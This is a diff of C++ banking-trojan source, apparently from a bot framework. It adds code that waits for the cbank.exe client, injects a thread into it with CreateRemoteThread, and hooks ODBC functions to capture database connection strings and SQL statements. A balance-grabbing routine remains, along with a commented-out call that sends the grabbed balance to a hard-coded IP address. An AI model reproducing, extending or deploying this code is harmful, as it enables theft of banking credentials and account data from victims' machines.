@@ -12,8 +12,13 @@
 #include "Strings.h"
 #include "VideoRecorder.h"
 #include "BotHTTP.h"
+#include "Inject.h"
+#include "BotCore.h"
+#include <sql.h>
+#include <sqltypes.h>
+#include <sqlext.h>
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace BBS_CALC
 {
@@ -21,45 +26,108 @@ namespace BBS_CALC
 }
 
 // Объявляем шаблон вывода отладочных строк
-#define BBS_DBG BBS_CALC::DBGOutMessage<>
+#define DBG BBS_CALC::DBGOutMessage<>
 
-
-/*
-bool IsBBSCBank()
+namespace CBank
 {
-	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
-	bool ret = false;
-	if ( ModulePath == NULL )
+
+SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
+     SQLHDBC         ConnectionHandle,
+     SQLHWND         WindowHandle,
+     SQLCHAR *       InConnectionString,
+     SQLSMALLINT     StringLength1,
+     SQLCHAR *       OutConnectionString,
+     SQLSMALLINT     BufferLength,
+     SQLSMALLINT *   StringLength2Ptr,
+     SQLUSMALLINT    DriverCompletion);
+
+SQLRETURN (WINAPI *pHandlerSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength);
+
+static char strODBCConnect[MAX_PATH];
+
+static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
+					      SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength,
+						  SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion )
+{
+	if( strODBCConnect[0] == 0 )
+	{
+		m_lstrcpy( strODBCConnect, (char*)InConnectionString );
+		DBG( "CBank", "StringConnect='%s'", InConnectionString );
+	}
+	return pHandlerSQLDriverConnectA( ConnectionHandle, WindowHandle, InConnectionString, StringLength1,
+						  OutConnectionString, BufferLength, StringLength2Ptr, DriverCompletion );
+}
+
+SQLRETURN WINAPI HandlerSQLPrepareA( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength)
+{
+	DBG( "CBank", "SQL='%s'", StatementText );
+	return pHandlerSQLPrepareA( StatementHandle, StatementText, TextLength );
+}
+
+bool InjectIntoProcess( DWORD pid, DWORD (WINAPI *func)(LPVOID) )
+{
+	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;
+	CLIENT_ID ClientID;
+
+	ClientID.UniqueProcess = (HANDLE)pid;
+	ClientID.UniqueThread  = 0;
+
+	HANDLE hProcess;
+		
+	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
 	{
 		return false;
 	}
 
-	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
-	DWORD dwProcessHash = GetNameHash( ModulePath );
-	DbgMsgW(L"cbank.exe ", 1, L"%x", dwProcessHash);
+	DWORD dwAddr = InjectCode( hProcess, func );
 
-	if ( dwProcessHash == 0xD61CFB13 ) //cbank.exe
+	bool ret = false;
+
+	if ( dwAddr != -1 )
 	{
-		DbgMsgW(L"Run cbank.exe ",1,ModulePath);
-		ret = true;
+		if ( pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 ) != NULL )
+		{
+			ret = true;
+		}
 	}
-	MemFree( ModulePath );
+
+	pZwClose(hProcess);
+	
 	return ret;
 }
 
-
-void BBSGrabber()
+static bool SetHooks()
 {
-	OutputDebugString("BBSGrabber");
+	if( !HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &pHandlerSQLDriverConnectA ) ) return false;
+	if( !HookApi( DLL_ODBC32, 0xC09D6D06, HandlerSQLPrepareA, &pHandlerSQLPrepareA ) ) return false;	
+	return true;
 }
-*/
+
+static bool InitData()
+{
+	strODBCConnect[0] = 0;
+	return true;
+}
+
+//поток исполняющийся внутри cbank.exe (cbmain.ex)
+static DWORD WINAPI WorkInCBank(void*)
+{
+	BOT::Initialize();
+	if( !InitData() ) return 0;
+	char folderCBank[MAX_PATH];
+	pGetModuleFileNameA( 0, folderCBank, sizeof(folderCBank) );
+	DBG( "CBank", "Заинжектились в процесс '%s'", folderCBank );
+	SetHooks();
+	return 0;
+}
+
 
 char szDatabaseParam[]="database",
      szGetBalanceStatement[]="select Rest * 100,Account from Account";
 
-char *GrabBalance(char *lpPath)
+static char *GrabBalance(char *lpPath)
 {
-	BBS_DBG("BBSBank","GrabBalance");
+	DBG("CBank","GrabBalance");
     char *lpBalance=NULL;
     if (lpPath)
     {
@@ -174,9 +242,8 @@ char *GrabBalance(char *lpPath)
 }
 
 
-static DWORD IsRunBClient(char* path)
+static DWORD IsRunBClient( char* path )
 {
-	BBS_DBG("BBSBank","IsRunBClient");
 	HANDLE snap = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
 	PROCESSENTRY32W pe;
 	pe.dwSize = sizeof(pe);
@@ -204,9 +271,10 @@ static DWORD IsRunBClient(char* path)
 	return ret;
 }
 
-void WINAPI ThreadBBS(void*)
+//поток ждет запуска cbank.exe (через rootkit не ловится)
+static void WINAPI WaitRunCBank(void*)
 {
-	BBS_DBG("BBSBank","ThreadBBS");
+	DBG( "СBank", "WaitRunCBank" );
 	DWORD idCBank = 0;
 	char path[MAX_PATH];
 	path[0] = 0;
@@ -217,12 +285,13 @@ void WINAPI ThreadBBS(void*)
 		{
 			if( id )
 			{
-				BBS_DBG("BBSBank",path);
+				DBG( "CBank", "Start '%s'", path );
 				idCBank = id;
+				InjectIntoProcess( id, WorkInCBank );
+				/*
 				pPathRemoveFileSpecA(path); //убираем имя файла
 				pPathRemoveFileSpecA(path); //убираем папку EXE
 				char* sum= GrabBalance(path);
-				pOutputDebugStringA( sum ? sum : "null" );
 				
 				// http://91.228.133.67/boffl.php?uid=sdf23dsffdsf&bal=2324324243
 				PCHAR Buf = NULL;
@@ -233,6 +302,8 @@ void WINAPI ThreadBBS(void*)
 				HTTP::Get(URL, &Buf, NULL);
 				STR::Free(URL);
 				STR::Free(UID);
+				MemFree(sum);
+				*/
 
 				/*BBS_DBG("BBSBank","пишем видио.");
 				DWORD PID = 0;
@@ -240,7 +311,6 @@ void WINAPI ThreadBBS(void*)
 				if(PID != 0) 
 					StartRecordThread(PID,"BBSBank", NULL, NULL,700);
 				*/
-				MemFree(sum);
 			}
 		}
 		else
@@ -249,11 +319,13 @@ void WINAPI ThreadBBS(void*)
 				idCBank = 0;
 				path[0] = 0;
 			}
-		pSleep(1000*2);
+		pSleep( 2 * 1000 );
 	}
 }
 
-void RunThreadBBS()
+void Start()
 {
-	pCloseHandle( pCreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)ThreadBBS,(LPVOID)0, 0, NULL ));
+	StartThread( WaitRunCBank, 0 );
+}
+
 }
